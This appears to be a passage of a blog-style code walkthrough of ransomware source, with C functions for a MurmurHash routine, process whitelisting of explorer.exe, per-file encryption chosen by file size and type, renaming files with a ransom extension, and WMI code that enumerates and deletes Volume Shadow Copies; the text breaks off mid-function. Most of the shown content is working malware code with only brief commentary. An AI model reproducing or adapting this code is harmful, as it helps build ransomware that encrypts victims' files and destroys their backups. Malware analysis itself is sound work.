<li>&#96;&#96;&#96;<br>  #define mmix(h,k) { k *&#x3D; m; k ^&#x3D; k &gt;&gt; r; k *&#x3D; m; h *&#x3D; m; h ^&#x3D; k; }  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- finally return the hash by argument h</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &quot;..\memory.h&quot;</span><br><span class="line"></span><br><span class="line">#define mmix(h,k) &#123; k *= m; k ^= k &gt;&gt; r; k *= m; h *= m; h ^= k; &#125;</span><br><span class="line">#define LowerChar(C) if (C &gt;= &#x27;A&#x27; &amp;&amp; C &lt;= &#x27;Z&#x27;) &#123;C = C + (&#x27;a&#x27;-&#x27;A&#x27;);&#125;</span><br><span class="line"></span><br><span class="line">unsigned int MurmurHash2A(const void* key, int len, unsigned int seed)</span><br><span class="line">&#123;</span><br><span class="line">	char temp[64];</span><br><span class="line">	RtlSecureZeroMemory(temp, 64);</span><br><span class="line">	memory::Copy(temp, (PVOID)key, len);</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">		LowerChar(temp[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	const unsigned int m = 0x5bd1e995;</span><br><span class="line">	const int r = 24;</span><br><span class="line">	unsigned int l = len;</span><br><span class="line"></span><br><span class="line">	const unsigned char* data = (const unsigned char*)temp;</span><br><span class="line"></span><br><span class="line">	unsigned int h = seed;</span><br><span class="line">	unsigned int k;</span><br><span class="line"></span><br><span class="line">	while (len &gt;= 4)</span><br><span class="line">	&#123;</span><br><span class="line">		k = *(unsigned int*)data;</span><br><span class="line"></span><br><span class="line">		mmix(h, k);</span><br><span class="line"></span><br><span class="line">		data += 4;</span><br><span class="line">		len -= 4;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unsigned int t = 0;</span><br><span class="line"></span><br><span class="line">	switch (len)</span><br><span class="line">	&#123;</span><br><span class="line">	case 3: t ^= data[2] &lt;&lt; 16;</span><br><span class="line">	case 2: t ^= data[1] &lt;&lt; 8;</span><br><span class="line">	case 1: t ^= data[0];</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	mmix(h, t);</span><br><span class="line">	mmix(h, l);</span><br><span class="line"></span><br><span class="line">	h ^= h &gt;&gt; 13;</span><br><span class="line">	h *= m;</span><br><span class="line">	h ^= h &gt;&gt; 15;</span><br><span class="line"></span><br><span class="line">	return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Cryptor"><a href="#Cryptor" class="headerlink" title="Cryptor"></a>Cryptor</h2><h3 id="cryptor"><a href="#cryptor" class="headerlink" title="cryptor"></a>cryptor</h3><h4 id="cryptor-SetWhiteListProcess"><a href="#cryptor-SetWhiteListProcess" class="headerlink" title="cryptor::SetWhiteListProcess"></a>cryptor::SetWhiteListProcess</h4><p>Set white list Process, pass the specifical process（explorer.exe）.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cryptor-ChangeFileName"><a href="#cryptor-ChangeFileName" class="headerlink" title="cryptor::ChangeFileName"></a>cryptor::ChangeFileName</h4><p>just change the filename, used to add the extension for Encrypted file.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cryptor::ChangeFileName(__in LPCWSTR OldName)</span><br><span class="line">&#123;</span><br><span class="line">	LPWSTR NewName = (LPWSTR)memory::Alloc(<span class="number">32727</span>);</span><br><span class="line">	<span class="keyword">if</span> (!NewName) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)NewName);</span><br><span class="line"></span><br><span class="line">	plstrcpyW(NewName, OldName);</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)NewName);</span><br><span class="line"></span><br><span class="line">	plstrcatW(NewName, global::GetExtention());</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)OldName);</span><br><span class="line"></span><br><span class="line">	pMoveFileW(OldName, NewName);</span><br><span class="line">	memory::Free(NewName);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cryptor-Encrypt"><a href="#cryptor-Encrypt" class="headerlink" title="cryptor::Encrypt"></a>cryptor::Encrypt</h4><ul>
<li>Genkey</li>
<li>OpenFileEncrypt</li>
<li>CheckForDataBases<ul>
<li>WriteEncryptionInfo(FileInfo,FULL_ENCRYPT,0)</li>
<li>EncryptFull</li>
</ul>
</li>
<li>CheckForVirtualMachines<ul>
<li>WriteEncryptionInfo(FileInfo,PARTLY_ENCRYPT,20)</li>
<li>EncryptPartly</li>
</ul>
</li>
<li>judge the file size and use the fittest funtion to encrypt the different size range of file</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">BOOL</span><br><span class="line"><span class="title function_">cryptor::Encrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in LPBYTE Buffer,</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV CryptoProvider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Result = FALSE;</span><br><span class="line">	DWORD BytesToRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalRead = <span class="number">0</span>;</span><br><span class="line">	LONGLONG TotalWrite = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!GenKey(CryptoProvider, PublicKey, FileInfo)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t gen key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!OpenFileEncrypt(FileInfo)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CheckForDataBases(FileInfo-&gt;Filename)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (CheckForVirtualMachines(FileInfo-&gt;Filename)) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, <span class="number">20</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (FileInfo-&gt;FileSize &lt;= <span class="number">1048576</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, FULL_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptFull(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (FileInfo-&gt;FileSize &lt;= <span class="number">5242880</span>) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, HEADER_ENCRYPT, <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptHeader(FileInfo, Buffer, CryptoProvider, PublicKey);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (!WriteEncryptInfo(FileInfo, PARTLY_ENCRYPT, global::GetEncryptSize())) &#123;</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = EncryptPartly(FileInfo, Buffer, CryptoProvider, PublicKey, global::GetEncryptSize());</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Result) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(FileInfo-&gt;FileHandle);</span><br><span class="line">		FileInfo-&gt;FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line">		ChangeFileName(FileInfo-&gt;Filename);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseFile(FileInfo);</span><br><span class="line">	<span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="cryptor-DeleteShadowCopies"><a href="#cryptor-DeleteShadowCopies" class="headerlink" title="cryptor::DeleteShadowCopies"></a>cryptor::DeleteShadowCopies</h4><h5 id="Initialize-COM"><a href="#Initialize-COM" class="headerlink" title="Initialize COM"></a>Initialize COM</h5><ul>
<li>hres &#x3D; (HRESULT)<strong>pCoInitializeEx</strong>(0, COINIT_MULTITHREADED)</li>
</ul>
<h5 id="Set-general-COM-security-levels"><a href="#Set-general-COM-security-levels" class="headerlink" title="Set general COM security levels"></a>Set general COM security levels</h5><p>Registers security and sets the default security values for the process.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pCoInitializeSecurity(</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">-1</span>,                          <span class="comment">// COM authentication</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Authentication services</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Reserved</span></span><br><span class="line">		RPC_C_AUTHN_LEVEL_DEFAULT,   <span class="comment">// Default authentication </span></span><br><span class="line">		RPC_C_IMP_LEVEL_IMPERSONATE, <span class="comment">// Default Impersonation  </span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Authentication info</span></span><br><span class="line">		EOAC_NONE,                   <span class="comment">// Additional capabilities </span></span><br><span class="line">		<span class="literal">NULL</span>                         <span class="comment">// Reserved</span></span><br><span class="line">	);</span><br></pre></td></tr></table></figure>

<h5 id="Obtain-the-initial-locator-to-WMI"><a href="#Obtain-the-initial-locator-to-WMI" class="headerlink" title="Obtain the initial locator to WMI"></a>Obtain the initial locator to WMI</h5><ul>
<li>Intel: pCoCreateInstance(CLSID_WbemLocator,0,CLSCTX_INPROC_SERVER,IID_IWbemLocator, (LPVOID*)&amp;pLoc);</li>
<li>AMD: pCoCreateInstance(CLSID_WbemContext, 0, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext);<ul>
<li>BSTR Arch &#x3D; pSysAllocString(OBFW(L”__ProviderArchitecture”));</li>
<li>hres &#x3D; pContext-&gt;SetValue(Arch, 0, &amp;vArchitecture);</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">IWbemLocator* pLoc = <span class="literal">NULL</span>;</span><br><span class="line">	hres = (HRESULT)pCoCreateInstance(</span><br><span class="line">		CLSID_WbemLocator,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		CLSCTX_INPROC_SERVER,</span><br><span class="line">		IID_IWbemLocator, (LPVOID*)&amp;pLoc);</span><br><span class="line"></span><br><span class="line">	morphcode(pLoc);</span><br><span class="line"></span><br><span class="line">	IWbemContext* pContext = <span class="literal">NULL</span>;</span><br><span class="line">	SYSTEM_INFO SysInfo;</span><br><span class="line">	pGetNativeSystemInfo(&amp;SysInfo);</span><br><span class="line"></span><br><span class="line">	morphcode(SysInfo.dwActiveProcessorMask);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123;</span><br><span class="line"></span><br><span class="line">		hres = (HRESULT)pCoCreateInstance(CLSID_WbemContext, <span class="number">0</span>, CLSCTX_INPROC_SERVER, IID_IWbemContext, (LPVOID*)&amp;pContext);</span><br><span class="line">		<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">		&#123;</span><br><span class="line">			pCoUninitialize();</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(hres);</span><br><span class="line"></span><br><span class="line">		BSTR Arch = pSysAllocString(OBFW(<span class="string">L&quot;__ProviderArchitecture&quot;</span>));</span><br><span class="line"></span><br><span class="line">		VARIANT vArchitecture;</span><br><span class="line">		pVariantInit(&amp;vArchitecture);</span><br><span class="line">		V_VT(&amp;vArchitecture) = VT_I4;</span><br><span class="line">		V_INT(&amp;vArchitecture) = <span class="number">64</span>;</span><br><span class="line">		hres = pContext-&gt;SetValue(Arch, <span class="number">0</span>, &amp;vArchitecture);</span><br><span class="line"></span><br><span class="line">		morphcode(hres);</span><br><span class="line"></span><br><span class="line">		pVariantClear(&amp;vArchitecture);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">		&#123;</span><br><span class="line">			pCoUninitialize();</span><br><span class="line">			<span class="keyword">return</span> FALSE;                 <span class="comment">// Program has failed.</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Connect-to-WMI-through-the-IWbemLocator-ConnectServer-method"><a href="#Connect-to-WMI-through-the-IWbemLocator-ConnectServer-method" class="headerlink" title="Connect to WMI through the IWbemLocator::ConnectServer method"></a>Connect to WMI through the IWbemLocator::ConnectServer method</h5><p>The WMI namespace root&#x2F;cimv2 is the default namespace and contains classes for computer hardware and configuration.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BSTR Path = pSysAllocString(OBFW(<span class="string">L&quot;ROOT\\CIMV2&quot;</span>));</span><br><span class="line"></span><br><span class="line">	hres = pLoc-&gt;ConnectServer(</span><br><span class="line">		Path, <span class="comment">// Object path of WMI namespace</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// User name. NULL = current user</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// User password. NULL = current</span></span><br><span class="line">		<span class="number">0</span>,                       <span class="comment">// Locale. NULL indicates current</span></span><br><span class="line">		<span class="literal">NULL</span>,                    <span class="comment">// Security flags.</span></span><br><span class="line">		<span class="number">0</span>,                       <span class="comment">// Authority (for example, Kerberos)</span></span><br><span class="line">		pContext,                       <span class="comment">// Context object </span></span><br><span class="line">		&amp;pSvc                    <span class="comment">// pointer to IWbemServices proxy</span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	morphcode(pSvc);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		pLoc-&gt;Release();</span><br><span class="line">		pCoUninitialize();</span><br><span class="line">		<span class="keyword">return</span> FALSE;                <span class="comment">// Program has failed.</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Set-security-levels-on-the-proxy"><a href="#Set-security-levels-on-the-proxy" class="headerlink" title="Set security levels on the proxy"></a>Set security levels on the proxy</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">hres = (HRESULT)pCoSetProxyBlanket(</span><br><span class="line">		pSvc,                        <span class="comment">// Indicates the proxy to set</span></span><br><span class="line">		RPC_C_AUTHN_WINNT,           <span class="comment">// RPC_C_AUTHN_xxx</span></span><br><span class="line">		RPC_C_AUTHZ_NONE,            <span class="comment">// RPC_C_AUTHZ_xxx</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// Server principal name </span></span><br><span class="line">		RPC_C_AUTHN_LEVEL_CALL,      <span class="comment">// RPC_C_AUTHN_LEVEL_xxx </span></span><br><span class="line">		RPC_C_IMP_LEVEL_IMPERSONATE, <span class="comment">// RPC_C_IMP_LEVEL_xxx</span></span><br><span class="line">		<span class="literal">NULL</span>,                        <span class="comment">// client identity</span></span><br><span class="line">		EOAC_NONE                    <span class="comment">// proxy capabilities </span></span><br><span class="line">	);</span><br><span class="line"></span><br><span class="line">	morphcode(hres);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">	&#123;</span><br><span class="line">		pSvc-&gt;Release();</span><br><span class="line">		pLoc-&gt;Release();</span><br><span class="line">		pCoUninitialize();</span><br><span class="line">		<span class="keyword">return</span> FALSE;               <span class="comment">// Program has failed.</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Use-the-IWbemServices-pointer-to-make-requests-of-WMI"><a href="#Use-the-IWbemServices-pointer-to-make-requests-of-WMI" class="headerlink" title="Use the IWbemServices pointer to make requests of WMI"></a>Use the IWbemServices pointer to make requests of WMI</h5><blockquote>
<h5 id="Get-the-data-from-the-query-in-step-6"><a href="#Get-the-data-from-the-query-in-step-6" class="headerlink" title="Get the data from the query in step 6"></a>Get the data from the query in step 6</h5><p>this is the main code of the function </p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">BSTR WqlStr = pSysAllocString(OBFW(<span class="string">L&quot;WQL&quot;</span>));</span><br><span class="line">BSTR Query = pSysAllocString(OBFW(<span class="string">L&quot;SELECT * FROM Win32_ShadowCopy&quot;</span>));</span><br><span class="line"></span><br><span class="line">IEnumWbemClassObject* pEnumerator = <span class="literal">NULL</span>;</span><br><span class="line">hres = pSvc-&gt;ExecQuery(</span><br><span class="line">	WqlStr,</span><br><span class="line">	Query,</span><br><span class="line">	WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,</span><br><span class="line">	<span class="literal">NULL</span>,</span><br><span class="line">	&amp;pEnumerator);</span><br><span class="line"></span><br><span class="line">morphcode(hres);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FAILED(hres))</span><br><span class="line">&#123;</span><br><span class="line">	pSvc-&gt;Release();</span><br><span class="line">	pLoc-&gt;Release();</span><br><span class="line">	pCoUninitialize();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;               <span class="comment">// Program has failed.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>get the data from the query and Delete the shadowcopy.</strong></p>
<p>generate the delete shadowcopy command, then use the Enumerator to delete every one of them.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">IWbemClassObject* pclsObj = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uReturn = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(pEnumerator);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (pEnumerator)</span><br><span class="line">	&#123;</span><br><span class="line">		